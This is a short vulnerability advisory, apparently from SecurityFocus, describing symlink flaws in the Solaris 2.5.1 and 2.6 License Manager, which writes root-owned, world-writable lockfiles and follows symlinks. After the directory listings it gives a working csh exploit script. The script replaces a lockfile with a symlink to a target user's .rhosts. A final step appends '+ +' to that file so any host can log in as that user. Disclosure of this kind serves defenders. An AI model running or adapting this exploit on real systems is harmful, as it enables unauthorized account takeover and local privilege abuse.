source: http://www.securityfocus.com/bid/461/info

The Solaris License Manager that ships with versions 2.5.1 and 2.6 is vulnerable to multiple symlink attacks. License Manager creates lockfiles owned by root and set mode 666 which it writes to regularily. It follows symlinks.


bash$ ls -l /var/tmp/lock*
-rw-rw-rw- 1 root root 0 Oct 21 18:24 /var/tmp/lockESRI
-rw-rw-rw- 1 root root 0 Oct 21 16:40 /var/tmp/lockISE-TCADd
-rw-rw-rw- 1 root root 0 Oct 21 14:29 /var/tmp/lockalta
-rw-rw-rw- 1 root root 0 Oct 21 18:52 /var/tmp/lockansysd
-rw-rw-rw- 1 root root 0 Oct 21 18:52 /var/tmp/lockasterxd
-rw-rw-rw- 1 root root 0 Oct 21 16:40 /var/tmp/lockhpeesofd
-rw-rw-rw- 1 root root 0 Oct 21 18:46 /var/tmp/locksuntechd


And:

bash$ ls -l /var/tmp/.flexlm
total 2
-rw-rw-rw- 1 root root 163 Oct 21 19:55 lmgrd.211



There are several lockfiles created by the License Manager. It is trivial to gain root access locally through exploitation of this vulnerability. 

------
#!/bin/csh -f
# Change target user name before running
# Iconoclast@thepentagon.com 10/98
rm /tmp/locksuntechd
ln -s ~targetuser/.rhosts /tmp/locksuntechd
exit
------
then wait a min and cat + + >> ~targetuser/.rhosts